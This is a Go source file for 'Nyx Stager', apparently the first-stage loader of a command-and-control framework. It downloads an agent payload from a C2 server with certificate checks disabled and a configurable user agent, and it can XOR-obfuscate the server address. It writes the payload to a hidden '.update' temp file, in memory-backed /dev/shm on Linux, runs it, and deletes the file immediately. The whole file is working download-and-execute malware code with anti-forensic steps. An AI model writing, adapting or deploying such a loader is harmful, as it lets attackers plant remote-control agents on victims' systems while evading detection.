// Nyx Stager — minimal first-stage loader.
// Downloads the full agent stage from the C2 server and executes it in memory (Linux)
// or from a self-deleting temp path (macOS/Windows).
package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// Overridden at build time via -ldflags
var C2URL       = "http://127.0.0.1:8000"
var XORKey      = ""
var ProfileUA   = ""
var ProfileCheckin = "/api/builder/stage"

func xorDecodeHex(hexStr, key string) string {
	if len(hexStr)%2 != 0 {
		return hexStr
	}
	b := make([]byte, len(hexStr)/2)
	for i := 0; i < len(b); i++ {
		var val byte
		fmt.Sscanf(hexStr[i*2:i*2+2], "%02x", &val)
		b[i] = val ^ key[i%len(key)]
	}
	return string(b)
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
	Timeout: 60 * time.Second,
}

func fetchStage() ([]byte, error) {
	url := fmt.Sprintf("%s/api/builder/stage/%s/%s", C2URL, runtime.GOOS, runtime.GOARCH)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	if ProfileUA != "" {
		req.Header.Set("User-Agent", ProfileUA)
	}
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("stage server returned %d", resp.StatusCode)
	}
	return io.ReadAll(resp.Body)
}

func main() {
	if XORKey != "" {
		C2URL = xorDecodeHex(C2URL, XORKey)
	}

	data, err := fetchStage()
	if err != nil {
		os.Exit(1)
	}

	exec_stage(data)
}

func exec_stage(data []byte) {
	switch runtime.GOOS {
	case "linux":
		execLinux(data)
	default:
		execTempFile(data)
	}
}

func execTempFile(data []byte) {
	ext := ""
	if runtime.GOOS == "windows" {
		ext = ".exe"
	}
	// Use /dev/shm on Linux (memory-backed fs), /tmp elsewhere
	tmpDir := os.TempDir()
	if runtime.GOOS == "linux" {
		if _, err := os.Stat("/dev/shm"); err == nil {
			tmpDir = "/dev/shm"
		}
	}

	f, err := os.CreateTemp(tmpDir, ".update*"+ext)
	if err != nil {
		os.Exit(1)
	}
	path := f.Name()
	f.Write(data)
	f.Close()
	os.Chmod(path, 0700)

	cmd := exec.Command(path)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		os.Remove(path)
		os.Exit(1)
	}
	// Delete the file immediately after launching (process keeps fd open on Linux)
	os.Remove(path)
	os.Exit(0)
}
